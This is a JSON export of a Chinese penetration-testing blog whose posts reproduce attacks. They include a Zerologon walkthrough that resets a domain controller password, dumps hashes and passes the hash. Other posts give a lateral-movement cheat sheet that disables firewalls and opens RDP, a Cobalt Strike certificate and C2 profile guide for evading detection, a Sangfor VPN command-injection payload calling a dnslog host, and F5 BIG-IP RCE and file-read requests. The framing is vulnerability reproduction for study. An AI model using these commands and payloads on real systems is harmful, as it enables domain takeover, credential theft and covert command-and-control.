{"meta":{"title":"dr1nkw4ter's Blog","subtitle":"","description":"","author":"John Doe","url":"https://www.urso.dog","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2020-07-02T10:27:30.544Z","updated":"2020-07-02T06:38:17.176Z","comments":false,"path":"/404.html","permalink":"https://www.urso.dog/404.html","excerpt":"","text":""},{"title":"whoami","date":"2020-08-20T12:14:47.570Z","updated":"2020-08-20T12:14:47.562Z","comments":false,"path":"about/index.html","permalink":"https://www.urso.dog/about/index.html","excerpt":"","text":"截止2020-7-2日，毕业时长一年，练习时长不足两年半的渗透测试训练生。"},{"title":"友情链接","date":"2020-07-02T10:27:30.578Z","updated":"2020-07-02T06:38:17.177Z","comments":true,"path":"links/index.html","permalink":"https://www.urso.dog/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-07-02T10:27:30.592Z","updated":"2020-07-02T06:38:17.177Z","comments":false,"path":"tags/index.html","permalink":"https://www.urso.dog/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2020-07-02T15:12:09.662Z","updated":"2020-07-02T06:38:17.177Z","comments":false,"path":"categories/index.html","permalink":"https://www.urso.dog/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"NetLogon特权提升漏洞(CVE-2020-1472)","slug":"NetLogon特权提升漏洞-CVE-2020-1472","date":"2020-09-17T08:21:29.000Z","updated":"2020-09-17T14:42:36.125Z","comments":true,"path":"2020/09/17/NetLogon特权提升漏洞-CVE-2020-1472/","link":"","permalink":"https://www.urso.dog/2020/09/17/NetLogon%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-CVE-2020-1472/","excerpt":"","text":"漏洞描述​ 在活动目录中比较重要的一个服务Netlogon，此服务在DC和域成员服务器上运行，为域身份验证提供重要服务，以及复制数据库以进行域控备份，同时还用于维护域成员与域之间、域与域控之间、域DC与跨域DC之间的关系如果此服务停止成员服务器将无法登陆到域中. ​ 此漏洞是微软8月份发布安全公告披露的紧急漏洞，漏洞评分10分，未经身份认证的攻击者可通过使用 Netlogon 远程协议（MS-NRPC）连接域控制器来利用此漏洞。成功利用此漏洞的攻击者可获得域管理员访问权限。 影响版本 Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation) 漏洞利用环境介绍：目标DC（win2012、ip：192.168.1.9）、本机win10（非域内） poc：https://github.com/SecuraBV/CVE-2020-1472 exp：https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472 ​ https://github.com/VoidSec/CVE-2020-1472 dumphash：impacket中的secretsdump.py 直接dumphash需要认证： 1、执行exp，会将域控的机器账户密码重置为空，此处为DC$： 1python CVE-2020-1472.py DC DC$ 192.168.1.9 2、使用空密码连接dump域控hash： 1python secretsdump.py study.com&#x2F;DC$@192.168.1.9 -no-pass （dump所有hash，仅dump域控-just-dc） 3、域控的机器账户密码已为空（31d6cfe0d16ae931b73c59d7e0c089c0）： 4、使用wmiexec对域管pth连接域控： 1wmiexec.exe study&#x2F;administrator@192.168.1.9 -hashes lm:ntlm 5、获取域控sam文件，读取机器账号原始hash： 123456789reg save HKLM\\SYSTEM system.savereg save HKLM\\SAM sam.savereg save HKLM\\SECURITY security.saveget system.saveget sam.saveget security.savedel &#x2F;f system.savedel &#x2F;f sam.savedel &#x2F;f security.save 6、读取sam文件：（注：参数加了security才可以读到机器账号hash） 1python secretsdump.py -sam sam.save -system system.save -security security.save local 机器账号原始hash： 7、还原机器账号hash： 1python reinstall_original_pw.py DC 192.168.1.9 10f9aa84af2deefe68441de3b017879b 8、查看DC$密码： 参考链接1.https://blog.csdn.net/weixin_45728976/article/details/107965579 2.https://blog.csdn.net/lhh134/article/details/108630955","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.urso.dog/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"权限提升","slug":"权限提升","permalink":"https://www.urso.dog/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"}]},{"title":"内网渗透命令速查","slug":"内网渗透命令速查","date":"2020-07-21T12:06:17.000Z","updated":"2020-09-23T14:36:08.142Z","comments":true,"path":"2020/07/21/内网渗透命令速查/","link":"","permalink":"https://www.urso.dog/2020/07/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/","excerpt":"","text":"信息收集本机信息收集查看计划任务： schtasks /query /fo LIST /V 查看安装软件信息： wmic product get name,version、powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot; 查看本机器服务： wmic service list brief 查看进程： tasklist /v、wmic process list brief 当前在线用户： query user || qwinsta 查看开机启动程序信息 ： wmic startup get command,caption 开机时间： net statistics workstation (管理员权限)与本机连接的客户端会话： net session 查询补丁： systeminfo、wmic qfe get Caption,Description,HotFixID,InstalledOn 查看防火墙配置： netsh fifirewall show config 修改防火墙： 12345netsh advfirewall firewall 【命令】 rule 【其他参数】&#x2F;&#x2F;dir&#x3D;out为出站，in为入站，name&#x3D;all为全部netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C:\\nc.exe&quot; &#x2F;&#x2F;2003以下netsh advfirewall firewall add rule name&#x3D;&quot;Remote 3389&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow &#x2F;&#x2F;2003以上（管理员） 关闭防火墙： netsh fifirewall set opmode disable //2003以下、netsh advfifirewall set allprofifiles state off //2003以上（管理员） 查看远程连接端口： REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /V PortNumber //0xd3d代表3389 开启远程连接： 1234567wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1 &#x2F;&#x2F;2003以下---2003以上，需要管理员权限wmic &#x2F;namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1 wmic &#x2F;namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f &#x2F;&#x2F;0开，1关 查看代理设置情况： reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot; 域内信息收集","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.urso.dog/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"https://www.urso.dog/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"CobaltStrike证书修改","slug":"CobaltStrike证书修改","date":"2020-07-20T02:43:24.000Z","updated":"2020-09-17T03:25:34.754Z","comments":true,"path":"2020/07/20/CobaltStrike证书修改/","link":"","permalink":"https://www.urso.dog/2020/07/20/CobaltStrike%E8%AF%81%E4%B9%A6%E4%BF%AE%E6%94%B9/","excerpt":"","text":"为什么要修改？1、CS的客户端和服务端通过ssl进行加密通讯，默认的证书配置文件导致很容易被各类检测设备识别。 2、除了修改如上所说的ssl证书外，cs中使用https上线有独立的证书，这个证书也需要修改用来防止被识别。 修改方法1、ssl加密证书创建服务端证书文件: 1keytool -keystore .&#x2F;cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias test -dname &quot;CN&#x3D;(名字与姓氏), OU&#x3D;(组织单位名称), O&#x3D;(组织名称), L&#x3D;(城市或区域名称), ST&#x3D;(州或省份名称), C&#x3D;(单位的两字母国家代码)&quot;&#96; 以下命令进行导入: 1keytool -importkeystore -srckeystore .&#x2F;cobaltstrike.store -destkeystore .&#x2F;cobaltstrike.store -deststoretype pkcs12 查看证书文件: 修改teamserver文件，端口建议一并修改： cobaltstrike.jar 中文件创建 放到cobaltstrike.jar/resources/ 12keytool -keystore .&#x2F;ssl.store -storepass newlife@2020 -keypass newlife@2020 -genkey -keyalg RSA -alias whoami -dname &quot;CN&#x3D;Jhon, OU&#x3D;hjnjh, O&#x3D;Chrome, L&#x3D;Somewhere, S&#x3D;Cyberspace, C&#x3D;Earth&quot; keytool -keystore .&#x2F;proxy.store -storepass newlife@2020 -keypass newlife@2020 -genkey -keyalg RSA -alias whoami -dname &quot;CN&#x3D;Jhon, OU&#x3D;hjnjh, O&#x3D;Chrome, L&#x3D;Somewhere, S&#x3D;Cyberspace, C&#x3D;Earth&quot; 2、https上线使用的证书12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879set sample_name &quot;tryblog POS Malware&quot;;set sleeptime &quot;5000&quot;; # use a ~30s delay between callbacksset jitter &quot;10&quot;; # throw in a 10% jitterset useragent &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; rv:24.0) Gecko&#x2F;20100101 Firefox&#x2F;24.0&quot;; #设置证书，注意以下内容得和你之前生成的证书一样：CN&#x3D;Jhon, OU&#x3D;Advanced, O&#x3D;Chrome, L&#x3D;Somewhere, S&#x3D;Cyberspace, C&#x3D;Earthhttps-certificate &#123; set CN &quot;Jhon&quot;; set O &quot;Chrome&quot;; set C &quot;Earth&quot;; set L &quot;Somewhere&quot;; set OU &quot;Advanced&quot;; set ST &quot;Cyberspace&quot;; set validity &quot;365&quot;;&#125;#设置，修改成你的证书名称和证书密码：CN&#x3D;Jhon, OU&#x3D;Advanced, O&#x3D;Chrome, L&#x3D;Somewhere, S&#x3D;Cyberspace, C&#x3D;Earthcode-signer&#123; set keystore &quot;cobaltstrike.store&quot;; set password &quot;123456&quot;; set alias &quot;test&quot;;&#125; #指定DNS beacon不用的时候指定到IP地址set dns_idle &quot;8.8.4.4&quot;; #每个单独DNS请求前强制睡眠时间set dns_sleep &quot;0&quot;; #通过DNS上载数据时主机名的最大长度[0-255]set maxdns &quot;235&quot;; http-post &#123; set uri &quot;&#x2F;windebug&#x2F;updcheck.php &#x2F;aircanada&#x2F;dark.php &#x2F;aero2&#x2F;fly.php &#x2F;windowsxp&#x2F;updcheck.php &#x2F;hello&#x2F;flash.php&quot;; client &#123; header &quot;Accept&quot; &quot;text&#x2F;plain&quot;; header &quot;Accept-Language&quot; &quot;en-us&quot;; header &quot;Accept-Encoding&quot; &quot;text&#x2F;plain&quot;; header &quot;Content-Type&quot; &quot;application&#x2F;x-www-form-urltrytryd&quot;; id &#123; netbios; parameter &quot;id&quot;; &#125; output &#123; base64; prepend &quot;&amp;op&#x3D;1&amp;id&#x3D;vxeykS&amp;ui&#x3D;Josh @ PC&amp;wv&#x3D;11&amp;gr&#x3D;backoff&amp;bv&#x3D;1.55&amp;data&#x3D;&quot;; print; &#125; &#125; server &#123; output &#123; print; &#125; &#125;&#125; http-get &#123; set uri &quot;&#x2F;updates&quot;; client &#123; metadata &#123; netbiosu; prepend &quot;user&#x3D;&quot;; header &quot;Cookie&quot;; &#125; &#125; server &#123; header &quot;Content-Type&quot; &quot;text&#x2F;plain&quot;; output &#123; base64; print; &#125; &#125;&#125; 使用c2lint 效验刚刚生成C2.profile：1.&#x2F;c2lint C2.profile 使用证书启动teamserver1nohup .&#x2F;teamserver 1.1.2.3 123456 .&#x2F;C2.profile &amp; 参考链接1、https://mp.weixin.qq.com/s/5MWDXN3eCaw9m-XHDGaXcQ 2、https://blog.csdn.net/shuteer_xu/article/details/106435793 3、https://blog.csdn.net/qq_41874930/article/details/107791606","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.urso.dog/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"工具","slug":"工具","permalink":"https://www.urso.dog/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"SXF-vpn远程命令执行","slug":"SXF-vpn远程命令执行","date":"2020-07-07T08:41:36.000Z","updated":"2020-07-08T09:10:17.092Z","comments":true,"path":"2020/07/07/SXF-vpn远程命令执行/","link":"","permalink":"https://www.urso.dog/2020/07/07/SXF-vpn%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"POC:https://ip/por/checkurl.csp?url=1.1.1.1;ping%20hpe7ow.dnslog.cn 复现：","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.urso.dog/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"https://www.urso.dog/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"Big-ip远程代码执行&本地文件读取","slug":"Big-ip远程代码执行-本地文件读取","date":"2020-07-07T04:23:41.000Z","updated":"2020-07-09T06:49:46.926Z","comments":true,"path":"2020/07/07/Big-ip远程代码执行-本地文件读取/","link":"","permalink":"https://www.urso.dog/2020/07/07/Big-ip%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","excerpt":"","text":"漏洞描述F5 BIG-IP 是美国F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。 在 F5 BIG-IP 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞。 未授权的远程攻击者通过向该页面发送特制的请求包，可以造成任意Java 代码执行。进而控制 F5 BIG-IP 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。 影响版本 BIG-IP 15.x: 15.1.0/15.0.0 BIG-IP 14.x: 14.1.0 ~ 14.1.2 BIG-IP 13.x: 13.1.0 ~ 13.1.3 BIG-IP 12.x: 12.1.0 ~ 12.1.5 BIG-IP 11.x: 11.6.1 ~ 11.6.5 网络空间搜索引擎： title=&quot;BIG-IP&amp;reg;- Redirect&quot; 漏洞复现poc： 12RCE：https:&#x2F;&#x2F;&lt;ip&gt;&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;tmshCmd.jsp?command&#x3D;list+auth+user+adminLFI：https:&#x2F;&#x2F;&lt;IP&gt;&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;fileRead.jsp?fileName&#x3D;&#x2F;etc&#x2F;passwd 目标站点： LFI： RCE（能够LFI不一定能RCE，另外此处的代码执行指的是V11 TMSH命令行： 执行系统命令：逐次执行以下语句：开启bash-&gt;在可执行目录下创建文件并写入命令-&gt;命令执行-&gt;还原 1234tmshCmd.jsp?command&#x3D;create+cli+alias+private+list+command+bashfileSave.jsp?fileName&#x3D;&#x2F;tmp&#x2F;cmd&amp;content&#x3D;idtmshCmd.jsp?command&#x3D;list+&#x2F;tmp&#x2F;cmdtmshCmd.jsp?command&#x3D;delete+cli+alias+private+list 补充：部分能够执行文件读取但是不能执行命令的情况，是因为该后台没有初始化，也就是说该后台从未被登录过。而第一步开启bash的功能需要初始化后才可以成功。此处后台的默认账户是admin，密码和系统root密码相同，可以尝试弱口令、执行list+auth+user+admin或者读取shadow文件(一般是没有权限的)解密后登录web端。第一次登录需要强制修改web登录密码，配置完成后登录后台会自动完成初始化。 修复方式升级至如下版本11.6.5.2, 12.1.5.2, 13.1.3.4, 14.1.2.6, 15.1.0.4 参考链接1.https://blog.csdn.net/wuyou1995/article/details/107170186/ 2.https://clouddocs.f5.com/api/tmsh/ 3.https://mp.weixin.qq.com/s/LczKnV5f7T-0Nw7p4q_0wg","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.urso.dog/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"代码执行","slug":"代码执行","permalink":"https://www.urso.dog/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"}]}],"categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.urso.dog/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.urso.dog/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.urso.dog/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"权限提升","slug":"权限提升","permalink":"https://www.urso.dog/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"信息收集","slug":"信息收集","permalink":"https://www.urso.dog/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"工具","slug":"工具","permalink":"https://www.urso.dog/tags/%E5%B7%A5%E5%85%B7/"},{"name":"命令执行","slug":"命令执行","permalink":"https://www.urso.dog/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"代码执行","slug":"代码执行","permalink":"https://www.urso.dog/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"}]}